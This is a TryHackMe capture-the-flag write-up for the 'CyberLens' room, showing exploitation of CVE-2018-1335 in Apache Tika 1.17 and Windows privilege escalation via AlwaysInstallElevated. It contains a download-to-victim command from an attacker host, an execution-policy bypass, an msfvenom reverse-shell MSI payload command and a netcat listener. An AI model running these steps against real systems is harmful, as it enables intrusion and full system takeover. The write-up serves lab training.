---
title: THM CyberLens
author: hanhctf
date: 2024-05-20 12:00:00 +0700
categories: [Write-up, THM]
tags: [CVE-2018-1335]
toc: true
mermaid: true
---

# [**CyberLens**](https://tryhackme.com/r/room/cyberlensp6)

# Summary
>
> - Port 61777 open ==> Apache Tika 1.17 Server ==> CVE-2018-1335
> - Use metasploit exploit user
> - Use PrivescCheck.ps1, check Windows Privilege Escalation  
> - AlwaysInstallElevated vuln

## NMAP

```text
PORT      STATE SERVICE       REASON  VERSION
80/tcp    open  http          syn-ack Apache httpd 2.4.57 ((Win64))
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack Microsoft Windows RPC
61777/tcp open  http          syn-ack Jetty 8.y.z-SNAPSHOT
```

## Web Enumeration

After enumeration port 80, nothing interested.  

Continous enumeration port 61777, we can see Apache Tika 1.17 Server.

![](/commons/THM/CyberLens/0_Apache_Tika_1.17_Server.png)

Quick search, we found CVE-201801335 for Apache Tika 1.17 Server on [exploit-db](https://www.exploit-db.com/exploits/47208)

## Foothold

Use Metasploit to exploit this vuln.
![](/commons/THM/CyberLens/1_metasploit_exploit.png)

Worked.

***GOT USER.TXT FLAG***

## Privilege Escalation

This tool can find in Github [PrivescCheck.ps1](https://github.com/itm4n/PrivescCheck).

We can use curl to upload PrivescCheck.ps1 to victim via powershell.
In this case. I run local server with `python3 -m http.server 80` to host PrivescCheck.ps1 file.
In victim machine, we get .ps1 via `Invoke-WebRequest -Uri http://attack_IP:port/PrivescCheck.ps1 -Outfile PrivescCheck.ps1`

Run tools:

```shell
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"
```

We found a vuln that can be exploit.

![](/commons/THM/CyberLens/2_Always_Install_Elevated.png)

And we can use [this exploit](https://juggernaut-sec.com/alwaysinstallelevated/)

```text
msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.1.30 LPORT=443 -a x64 --platform Windows -f msi -o evil.msi
```

And upload from local.
In another terminal, listen on port 443 `sudo nc -nlvp 443`

After get evil.msi in victim from local.
Just run file. And we got system.
![](/commons/THM/CyberLens/3_Root.png)

***GOT ADMIN.TXT FLAG***
